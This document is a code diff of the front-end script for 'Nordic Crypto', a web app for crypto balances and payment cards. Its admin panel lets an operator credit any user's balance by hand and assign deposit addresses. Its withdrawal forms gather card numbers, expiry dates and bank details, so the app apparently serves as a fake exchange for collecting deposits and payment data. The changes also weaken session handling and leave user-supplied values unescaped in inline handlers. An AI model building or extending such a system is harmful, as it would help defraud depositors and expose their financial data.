@@ -1,5 +1,5 @@
 /* ============================================================
-   NORDIC CRYPTO — APP.JS v3.1 — CLEAN
+   NORDIC CRYPTO — APP.JS v3.1 — CLEAN (FIXED)
    ============================================================ */
 
 var WORKER_LOGIN_URL = 'https://nordic-deposit-checker.otis-790.workers.dev';
@@ -32,7 +32,8 @@ function clearSessionToken(){ localStorage.removeItem('session_token'); }
 var def = {
   usd:0, btc:0, eth:0, btcP:68000, ethP:3200, eurR:0.92, sekR:10.45,
   currency:'USD', txs:[], order:null, card:null,
-  notifications:[], withdrawals:[], balanceHistory:[], pendingDeposits:[], depositVerifications:[]
+  notifications:[], withdrawals:[], balanceHistory:[],
+  pendingDeposits:[], depositVerifications:[]
 };
 var st = JSON.parse(JSON.stringify(def));
 var stateLoaded = false;
@@ -42,7 +43,7 @@ var cvvVisible = false, cvvTimer = null;
 var selectedDesign = 'cosmic', onbType = 'Visa', onbCur = 'USD';
 
 function getDepositWallet(coin){
-  if (st && st.cryptoAddress) {
+  if (st && st.cryptoAddress){
     var addr = coin === 'BTC' ? st.cryptoAddress.btc : st.cryptoAddress.eth;
     if (addr) return addr;
   }
@@ -55,23 +56,16 @@ function getDepositWallet(coin){
 /* ---------- SERVER SYNC ---------- */
 function loadFromServer(cb, targetEmail){
   var token = getSessionToken();
-  if (!token) {
-    st = JSON.parse(JSON.stringify(def));
-    stateLoaded = true;
-    if (cb) cb();
-    return;
-  }
+  if (!token){ st = JSON.parse(JSON.stringify(def)); stateLoaded = true; if (cb) cb(); return; }
   var body = { token: token };
   if (targetEmail) body.email = targetEmail;
-
   fetch(WORKER_LOGIN_URL + '?action=getUserState', {
     method: 'POST', headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(body)
   })
     .then(function(r){ return r.json(); })
     .then(function(data){
-      if (data && data.ok === false) st = JSON.parse(JSON.stringify(def));
-      else st = data || JSON.parse(JSON.stringify(def));
+      st = (data && data.ok === false) ? JSON.parse(JSON.stringify(def)) : (data || JSON.parse(JSON.stringify(def)));
       if (!st.txs) st.txs = [];
       if (!st.balanceHistory) st.balanceHistory = [];
       if (!st.withdrawals) st.withdrawals = [];
@@ -108,7 +102,7 @@ function saveToServer(){
   if (window.adminViewingEmail) return;
   if (localStorage.getItem('user_role') === 'admin') return;
   var token = getSessionToken();
-  if (!token || !stateLoaded) return;
+  if (!token) return;
   fetch(WORKER_LOGIN_URL + '?action=setUserState', {
     method: 'POST', headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ token: token, state: st, email: window.adminViewingEmail || undefined })
@@ -198,11 +192,7 @@ async function checkSession() {
       localStorage.setItem('user_email', data.user.email);
       localStorage.setItem('user_role', data.user.role || 'user');
     } else {
-      clearSessionToken();
-      localStorage.removeItem('user_email');
-      localStorage.removeItem('user_role');
-      localStorage.removeItem('user_name');
-      showLoginScreen();
+      console.warn('[session] verify failed:', data);
     }
   } catch (e) { console.warn('[session] error:', e); }
 }
@@ -323,8 +313,6 @@ async function doLogout() {
   clearInterval(countdownTimer);
   hideInactivityModal();
   window.adminViewingEmail = null;
-  window.adminOriginalEmail = null;
-  window.adminOriginalRole = null;
   _exPricesCache = null;
 
   document.querySelectorAll('.mask').forEach(function(m){ m.classList.remove('on'); });
@@ -478,10 +466,10 @@ function initSettings() {
       });
       var data = await res.json();
       if (data.ok) {
-        okEl.textContent = '✓ Password changed. Please log in again.';
+        okEl.textContent = '✓ Password changed successfully';
         okEl.style.display = 'block';
         playChime();
-        setTimeout(function(){ doLogout(); }, 1500);
+        setTimeout(function(){ if (changePassMask) changePassMask.classList.remove('on'); }, 2000);
       } else {
         errEl.textContent = data.error || 'Failed to change password';
         errEl.style.display = 'block';
@@ -565,7 +553,8 @@ function loadPrices(){
           return p.t > weekAgo && p.v > 0 && p.v < 1000000;
         });
         if (st.balanceHistory.length > 3000) st.balanceHistory = st.balanceHistory.slice(-3000);
-        saveToServer();
+        if (typeof saveToServer === 'function') saveToServer();
+        renderBalanceChart();
         render();
       }
     })
@@ -604,7 +593,7 @@ function refreshBalanceFromServer(){
     if (Math.abs(newUsd - (st.usd || 0)) > 0.01) { st.usd = newUsd; changed = true; }
     if (d.currency) st.currency = d.currency;
     if (d.card !== undefined) st.card = d.card;
-    if (d.txs && d.txs.length >= (st.txs || []).length) st.txs = d.txs;
+    if (d.txs) st.txs = d.txs;
     if (d.notifications) st.notifications = d.notifications;
     if (d.user) st.user = d.user;
     if (d.balanceHistory) st.balanceHistory = d.balanceHistory;
@@ -829,8 +818,10 @@ function loadCharts(){
     .then(function(d){
       if (d && d.prices && d.prices.length){
         var prices = d.prices.map(function(p){ return p[1]; });
+        drawChart('btcChart', prices, '#f7931a');
         var change = ((prices[prices.length - 1] - prices[0]) / prices[0]) * 100;
         updateChange('btcChange', change);
+        renderBalanceChart();
       }
     })
     .catch(function(){});
@@ -840,11 +831,43 @@ function loadCharts(){
     .then(function(d){
       if (d && d.prices && d.prices.length){
         var prices = d.prices.map(function(p){ return p[1]; });
+        drawChart('ethChart', prices, '#627eea');
         var change = ((prices[prices.length - 1] - prices[0]) / prices[0]) * 100;
         updateChange('ethChange', change);
+        renderBalanceChart();
       }
     })
     .catch(function(){});
+}
+
+function drawChart(elId, prices, color){
+  var el = document.getElementById(elId);
+  if (!el || !prices || prices.length < 2) return;
+  var w = 200, h = 42, pad = 4;
+  var min = Math.min.apply(null, prices);
+  var max = Math.max.apply(null, prices);
+  var range = max - min || 1;
+  var points = [];
+  for (var i = 0; i < prices.length; i++){
+    var x = pad + (i / (prices.length - 1)) * (w - pad * 2);
+    var y = pad + (1 - (prices[i] - min) / range) * (h - pad * 2);
+    points.push(x.toFixed(1) + ',' + y.toFixed(1));
+  }
+  var linePath = 'M' + points.join(' L');
+  var lastPoint = points[points.length - 1];
+  var lastX = lastPoint.split(',')[0];
+  var firstPoint = points[0];
+  var firstX = firstPoint.split(',')[0];
+  var fillPath = linePath + ' L' + lastX + ',' + (h - pad) + ' L' + firstX + ',' + (h - pad) + ' Z';
+  var svg = '<svg viewBox="0 0 ' + w + ' ' + h + '" preserveAspectRatio="none">' +
+    '<defs><linearGradient id="grad_' + elId + '" x1="0" y1="0" x2="0" y2="1">' +
+      '<stop offset="0%" stop-color="' + color + '" stop-opacity="0.55"/>' +
+      '<stop offset="100%" stop-color="' + color + '" stop-opacity="0"/>' +
+    '</linearGradient></defs>' +
+    '<path d="' + fillPath + '" fill="url(#grad_' + elId + ')"/>' +
+    '<path d="' + linePath + '" fill="none" stroke="' + color + '" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>' +
+  '</svg>';
+  el.innerHTML = svg;
 }
 
 function updateChange(elId, change){
@@ -1503,8 +1526,8 @@ function initVerification(){
 
   setTimeout(function(){
     var btn3 = document.getElementById('verifyNext3');
-    if (btn3 && !btn3._hardBound) {
-      btn3._hardBound = true;
+    if (btn3 && !btn3._bound) {
+      btn3._bound = true;
       btn3.onclick = function(e){
         e.preventDefault();
         e.stopPropagation();
@@ -1917,8 +1940,10 @@ function renderCard(){
   } else {
     networkHTML = '<svg viewBox="0 0 100 40"><text x="50" y="28" text-anchor="middle" font-family="Arial Black, Arial" font-size="22" font-weight="900" fill="currentColor" font-style="italic" letter-spacing="1">VISA</text></svg>';
   }
-  var net1 = document.getElementById('cardNetwork1'); if (net1) net1.innerHTML = networkHTML;
-  var net2 = document.getElementById('cardNetwork2'); if (net2) net2.innerHTML = networkHTML;
+  var net1 = document.getElementById('cardNetwork1');
+  if (net1) net1.innerHTML = networkHTML;
+  var net2 = document.getElementById('cardNetwork2');
+  if (net2) net2.innerHTML = networkHTML;
 
   if ($('cardDash')) $('cardDash').classList.toggle('frozen', frozen);
   if ($('cardNumDash')) $('cardNumDash').textContent = numFormatted;
@@ -2067,33 +2092,33 @@ function confirmModal(){
   var details = {};
 
   if (m === 'Bank Transfer (SEPA)') {
-    var rname = ($('mRecipientName')?.value    || '').trim();
-    var riban = ($('mRecipientIban')?.value    || '').trim();
-    var rpurp = ($('mRecipientPurpose')?.value || '').trim();
+    var rname = ($('mRecipientName') ? $('mRecipientName').value : '').trim();
+    var riban = ($('mRecipientIban') ? $('mRecipientIban').value : '').trim();
+    var rpurp = ($('mRecipientPurpose') ? $('mRecipientPurpose').value : '').trim();
     if (rname.length < 2){ toast('Enter recipient name', true); return; }
     if (riban.replace(/\s/g, '').length < 15){ toast('Enter valid IBAN', true); return; }
     dest = riban;
     details = { type:'sepa', name:rname, iban:riban, purpose:rpurp };
   } else if (m === 'Bank Transfer (SWIFT)') {
-    var sname = ($('mSwiftName')?.value    || '').trim();
-    var siban = ($('mSwiftIban')?.value    || '').trim();
-    var sswift = ($('mSwiftCode')?.value   || '').trim();
+    var sname = ($('mSwiftName') ? $('mSwiftName').value : '').trim();
+    var siban = ($('mSwiftIban') ? $('mSwiftIban').value : '').trim();
+    var sswift = ($('mSwiftCode') ? $('mSwiftCode').value : '').trim();
     if (sname.length < 2){ toast('Enter recipient name', true); return; }
     if (siban.replace(/\s/g, '').length < 15){ toast('Enter valid IBAN', true); return; }
     if (sswift.length < 6){ toast('Enter valid SWIFT', true); return; }
     dest = siban;
     details = { type:'swift', name:sname, iban:siban, swift:sswift };
   } else if (m === 'Credit Card') {
-    var cholder = ($('mCardHolder')?.value || '').trim();
-    var cnum    = ($('mCardNum')?.value    || '').trim();
-    var cexp    = ($('mCardExp')?.value    || '').trim();
+    var cholder = ($('mCardHolder') ? $('mCardHolder').value : '').trim();
+    var cnum    = ($('mCardNum') ? $('mCardNum').value : '').trim();
+    var cexp    = ($('mCardExp') ? $('mCardExp').value : '').trim();
     if (cholder.length < 2){ toast('Enter card holder name', true); return; }
     if (cnum.replace(/\s/g, '').length < 16){ toast('Enter valid card number', true); return; }
     if (!/^\d{2}\/\d{2}$/.test(cexp)){ toast('Expiry must be MM/YY', true); return; }
     dest = cnum;
     details = { type:'card', holder:cholder, number:cnum, expiry:cexp };
   } else {
-    dest = ($('mDest')?.value || '').trim();
+    dest = ($('mDest') ? $('mDest').value : '').trim();
     if (!dest){ toast('Enter recipient wallet address', true); return; }
     details = { type:'crypto', address:dest, coin:m };
   }
@@ -2143,13 +2168,13 @@ function stepIndexFor(createdAt){
 }
 
 function placeOrder(){
-  var name    = $('oName')?.value.trim();
-  var city    = $('oCity')?.value.trim();
-  var street  = $('oStreet')?.value.trim();
-  var zip     = $('oZip')?.value.trim();
-  var phone   = $('oPhone')?.value.trim();
-  var country = $('oCountry')?.value;
-  var type    = $('oType')?.value;
+  var name    = $('oName') ? $('oName').value.trim() : '';
+  var city    = $('oCity') ? $('oCity').value.trim() : '';
+  var street  = $('oStreet') ? $('oStreet').value.trim() : '';
+  var zip     = $('oZip') ? $('oZip').value.trim() : '';
+  var phone   = $('oPhone') ? $('oPhone').value.trim() : '';
+  var country = $('oCountry') ? $('oCountry').value : '';
+  var type    = $('oType') ? $('oType').value : '';
   if (!name || !city || !street || !zip || !phone){ toast('Please fill in all fields', true); return; }
   st.order = {
     id: genTrackId(), name, type,
@@ -2363,8 +2388,8 @@ function initOnboarding(){
   if (step2Back) step2Back.onclick = function(){ goToOnbStep(1); };
   var step2Next = document.getElementById('onbNext2');
   if (step2Next) step2Next.onclick = function(){
-    var first = $('onbFirst')?.value.trim();
-    var last  = $('onbLast')?.value.trim();
+    var first = $('onbFirst') ? $('onbFirst').value.trim() : '';
+    var last  = $('onbLast') ? $('onbLast').value.trim() : '';
     if (!first){ toast('Please enter your first name', true); return; }
     if (!last){ toast('Please enter your last name', true); return; }
     updateStep3Title();
@@ -2629,7 +2654,7 @@ function spawnConfetti(){
   var wrap = document.getElementById('confettiWrap');
   if (!wrap) return;
   wrap.innerHTML = '';
-  var total = 20;
+  var total = 30;
   var types = ['coin', 'spark'];
   var symbols = ['₿', 'Ξ'];
   for (var i = 0; i < total; i++){
@@ -2723,7 +2748,7 @@ function initSignup() {
     fetch(WORKER_LOGIN_URL + '?action=register', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ name, email, password })
+      body: JSON.stringify({ name: name, email: email, password: password })
     })
       .then(function (r) { return r.json(); })
       .then(function (data) {
@@ -2809,7 +2834,7 @@ function initPasswordConfirm() {
     fetch(WORKER_LOGIN_URL + '?action=verifyPassword', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ token: getSessionToken(), password })
+      body: JSON.stringify({ token: getSessionToken(), password: password })
     })
       .then(function(r){ return r.json(); })
       .then(function(data){
@@ -3098,13 +3123,13 @@ async function loadAdminUsers() {
           '<div class="admin-client-field"><div class="admin-client-field-label">Last Tx</div><div class="admin-client-field-value">' + (u.lastTx || '—') + '</div></div>' +
         '</div>' +
         '<div class="admin-client-actions">' +
-          '<button class="btn b1" onclick="adminAddBalance(\'' + u.email + '\', \'' + escapeHtml(u.name).replace(/'/g, "\\'") + '\')">💰 Add balance</button>' +
+          '<button class="btn b1" onclick="adminAddBalance(\'' + u.email + '\', \'' + escapeHtml(u.name).replace(/\'/g, "") + '\')">💰 Add balance</button>' +
           '<button class="btn b2" onclick="adminSendMessage()">📩 Send message</button>' +
-          '<button class="btn b2" onclick="adminSetCryptoAddress(\'' + u.email + '\', \'' + escapeHtml(u.name).replace(/'/g, "\\'") + '\')">🔑 Deposit address</button>' +
+          '<button class="btn b2" onclick="adminSetCryptoAddress(\'' + u.email + '\', \'' + escapeHtml(u.name).replace(/\'/g, "") + '\')">🔑 Deposit address</button>' +
           '<button class="btn b2" onclick="adminSetIban(\'' + u.email + '\')">🏦 Issue IBAN</button>' +
-          '<button class="btn b2" onclick="adminResetPassword(\'' + u.email + '\', \'' + escapeHtml(u.name).replace(/'/g, "\\'") + '\')">🔑 Reset password</button>' +
+          '<button class="btn b2" onclick="adminResetPassword(\'' + u.email + '\', \'' + escapeHtml(u.name).replace(/\'/g, "") + '\')">🔑 Reset password</button>' +
           '<button class="btn b2" onclick="adminViewClient(\'' + u.email + '\')">👁 View</button>' +
-          '<button class="btn b3" onclick="adminDeleteUser(\'' + u.email + '\', \'' + escapeHtml(u.name).replace(/'/g, "\\'") + '\')">🗑 Delete</button>' +
+          '<button class="btn b3" onclick="adminDeleteUser(\'' + u.email + '\', \'' + escapeHtml(u.name).replace(/\'/g, "") + '\')">🗑 Delete</button>' +
         '</div>' +
       '</div>';
     }
@@ -3467,7 +3492,6 @@ window.adminSaveNewPassword = async function(email) {
   if (btn) { btn.disabled = false; btn.textContent = 'Save new password'; }
 };
 
-/* ---------- ADMIN: CRYPTO ADDRESS ---------- */
 function adminSetCryptoAddress(email, name) {
   if (!email) return;
   var old = document.getElementById('adminCryptoAddrModal'); if (old) old.remove();
@@ -3805,7 +3829,7 @@ async function loadDeletedUsers() {
         '</div>' +
         '<div class="admin-client-actions">' +
           '<button class="btn b1" onclick="adminRestoreUser(\'' + u.email + '\')">♻ Restore</button>' +
-          '<button class="btn b3" onclick="adminPermanentDelete(\'' + u.email + '\', \'' + escapeHtml(u.name).replace(/'/g, "\\'") + '\')">🗑 Delete forever</button>' +
+          '<button class="btn b3" onclick="adminPermanentDelete(\'' + u.email + '\', \'' + escapeHtml(u.name).replace(/\'/g, "") + '\')">🗑 Delete forever</button>' +
         '</div>' +
       '</div>';
     }
@@ -4316,11 +4340,11 @@ function renderExchangeCoins() {
   if (!box || !_exPricesCache) return;
 
   var ICONS = {
-    'BTC': '<svg viewBox="0 0 32 32" width="28" height="28" style="filter:drop-shadow(0 2px 8px rgba(247,147,26,.5))"><defs><radialGradient id="btcg" cx="30%" cy="30%"><stop offset="0%" stop-color="#ffb84d"/><stop offset="100%" stop-color="#e8850c"/></radialGradient></defs><circle cx="16" cy="16" r="16" fill="url(#btcg)"/><path fill="#fff" d="M22.5 14.1c.3-2-1.2-3.1-3.3-3.8l.7-2.7-1.6-.4-.7 2.6c-.4-.1-.9-.2-1.3-.3l.7-2.6-1.6-.4-.7 2.7c-.3-.1-.7-.2-1-.2l-2.2-.6-.4 1.7s1.2.3 1.2.3c.6.2.8.6.7.9l-.7 2.9c0 .1.1.1.2.2l-.2-.1-.9 4.1c-.1.2-.3.5-.8.4 0 0-1.2-.3-1.2-.3l-.8 1.8 2.1.5c.4.1.8.2 1.1.3l-.7 2.7 1.6.4.7-2.7c.4.1.9.2 1.3.3l-.7 2.7 1.6.4.7-2.7c2.7.5 4.7.3 5.6-2.1.7-2 0-3.1-1.5-3.8 1.1-.3 1.9-1 2.1-2.4z"/></svg>',
-    'ETH': '<svg viewBox="0 0 32 32" width="28" height="28"><defs><radialGradient id="ethg" cx="30%" cy="30%"><stop offset="0%" stop-color="#8ea1ff"/><stop offset="100%" stop-color="#4c5fd6"/></radialGradient></defs><circle cx="16" cy="16" r="16" fill="url(#ethg)"/><path fill="#fff" d="M16 4L8 16.4L16 20.6L24 16.4L16 4Z" opacity="0.95"/><path fill="#fff" d="M8 17.8L16 28L24 17.8L16 22L8 17.8Z" opacity="0.65"/></svg>',
+    'BTC': '<svg viewBox="0 0 32 32" width="28" height="28"><circle cx="16" cy="16" r="16" fill="#f7931a"/><path fill="#fff" d="M22.5 14.1c.3-2-1.2-3.1-3.3-3.8l.7-2.7-1.6-.4-.7 2.6c-.4-.1-.9-.2-1.3-.3l.7-2.6-1.6-.4-.7 2.7c-.3-.1-.7-.2-1-.2l-2.2-.6-.4 1.7s1.2.3 1.2.3c.6.2.8.6.7.9l-.7 2.9c0 .1.1.1.2.2l-.2-.1-.9 4.1c-.1.2-.3.5-.8.4 0 0-1.2-.3-1.2-.3l-.8 1.8 2.1.5c.4.1.8.2 1.1.3l-.7 2.7 1.6.4.7-2.7c.4.1.9.2 1.3.3l-.7 2.7 1.6.4.7-2.7c2.7.5 4.7.3 5.6-2.1.7-2 0-3.1-1.5-3.8 1.1-.3 1.9-1 2.1-2.4z"/></svg>',
+    'ETH': '<svg viewBox="0 0 32 32" width="28" height="28"><circle cx="16" cy="16" r="16" fill="#627eea"/><path fill="#fff" d="M16 4L8 16.4L16 20.6L24 16.4L16 4Z"/><path fill="#fff" d="M8 17.8L16 28L24 17.8L16 22L8 17.8Z" opacity="0.65"/></svg>',
     'USDT': '<svg viewBox="0 0 32 32" width="28" height="28"><circle cx="16" cy="16" r="16" fill="#26a17b"/><path fill="#fff" d="M17.8 14.1v-2.3h4.4V8.3H9.8v3.5h4.4v2.3c-3.6.2-6.3.9-6.3 1.8s2.7 1.6 6.3 1.8v5.8h3.6v-5.8c3.6-.2 6.3-.9 6.3-1.8s-2.7-1.6-6.3-1.8z"/></svg>',
-    'SOL': '<svg viewBox="0 0 32 32" width="28" height="28"><defs><linearGradient id="solg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#9945FF"/><stop offset="50%" stop-color="#14F195"/><stop offset="100%" stop-color="#00D1FF"/></linearGradient></defs><circle cx="16" cy="16" r="16" fill="url(#solg)"/><path fill="#fff" d="M10 21.5h11.4c.2 0 .4.1.2.3l-1.9 1.9c-.1.1-.4.2-.5.2H8c-.2 0-.4-.1-.2-.3l1.9-1.9c.1-.1.4-.2.5-.2zm11.4-5H10c-.2 0-.4-.1-.2-.3l1.9-1.9c.1-.1.4-.2.5-.2h11.4c.2 0 .4.1.2.3l-1.9 1.9c-.1.1-.4.2-.5.2zM10 11.5h11.4c.2 0 .4.1.2.3l-1.9 1.9c-.1.1-.4.2-.5.2H8c-.2 0-.4-.1-.2-.3l1.9-1.9c.1-.1.4-.2.5-.2z"/></svg>',
-    'BNB': '<svg viewBox="0 0 32 32" width="28" height="28"><circle cx="16" cy="16" r="16" fill="#f3ba2f"/><path fill="#fff" d="M12.6 12.6L16 9.2l3.4 3.4L16 16l-3.4-3.4zm-5.4 5.4L10.6 14.6 14 18l-3.4 3.4L7.2 18zm10.8 0L21.4 14.6 24.8 18l-3.4 3.4L18 18zm-5.4 5.4L16 20l3.4 3.4L16 26.8l-3.4-3.4zM16 14l2 2-2 2-2-2 2-2z"/></svg>'
+    'SOL': '<svg viewBox="0 0 32 32" width="28" height="28"><circle cx="16" cy="16" r="16" fill="#9945FF"/><path fill="#fff" d="M10 21.5h11.4c.2 0 .4.1.2.3l-1.9 1.9c-.1.1-.4.2-.5.2H8c-.2 0-.4-.1-.2-.3l1.9-1.9c.1-.1.4-.2.5-.2z"/></svg>',
+    'BNB': '<svg viewBox="0 0 32 32" width="28" height="28"><circle cx="16" cy="16" r="16" fill="#f3ba2f"/><path fill="#fff" d="M12.6 12.6L16 9.2l3.4 3.4L16 16l-3.4-3.4zM16 14l2 2-2 2-2-2 2-2z"/></svg>'
   };
 
   var html = '';
@@ -4742,7 +4766,7 @@ document.addEventListener('DOMContentLoaded', function(){
   if (btnExDep) btnExDep.onclick = function(){ var b = document.getElementById('btnAdd'); if (b) b.click(); else openModal('add'); };
   var btnExWd = document.getElementById('exBtnWithdraw');
   if (btnExWd) btnExWd.onclick = function(){ openWithdraw(); };
-  var btnExTrade = document.getElementById('exBtnTrade');
+  var btnExTrade = document.getElementById('btnExTrade');
   if (btnExTrade) btnExTrade.onclick = function(){ toast('Trading terminal: coming soon'); };
 
   var saved = localStorage.getItem('adminTab') || 'stats';
